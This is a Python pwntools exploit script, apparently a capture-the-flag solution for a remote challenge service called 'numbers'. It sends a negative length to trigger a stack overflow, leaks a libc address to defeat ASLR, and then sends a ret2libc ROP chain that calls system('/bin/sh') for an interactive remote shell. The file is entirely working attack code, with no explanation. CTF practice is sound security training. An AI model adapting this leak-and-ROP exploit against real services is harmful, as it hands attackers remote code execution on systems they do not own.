#!/usr/bin/env python3

from pwn import *

exe = ELF("./numbers")
libc = ELF("./libc6_2.28-0ubuntu1_amd64.so")
ld = ELF("./ld-2.28.so")

context.binary = exe


def conn():
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})



def smash_it(r, payload):
    for _ in range(2):
        r.recvline()

    r.sendline("-1")
    r.recvline()
    r.send(payload)

def try_again(r, option):
    r.recvuntil("try again ?")
    r.recvline()
    r.send(option)

def main():
#    r = conn()
    r = remote("numbers.fword.wtf", 1237)

    smash_it(r, b"M"*0x8)
    ATOI = r.recvuntil("\x7f")
    ATOI = u64(ATOI[-6::] + b"\x00"*2) - 16
    log.info("atoi @ 0x%x", ATOI)
    try_again(r, "y")

    libc.address = ATOI - libc.sym['atoi']
    log.info("Libc base @ 0x%x", libc.address)

    system = libc.sym['system']
    offset = 72
    PopRdi = libc.address + 0x0000000000023a6f
    ret = libc.address + 0x000000000002235f
    #gdb.attach(r)

    payload = b"M"*offset
    payload += p64(PopRdi)
    log.info("Pop Rdi @ 0x%x", PopRdi)
    payload += p64(next(libc.search(b"/bin/sh")))
    payload += p64(ret)
    payload += p64(system)

    pause()
    smash_it(r, payload)

    r.interactive()


if __name__ == "__main__":
    main()
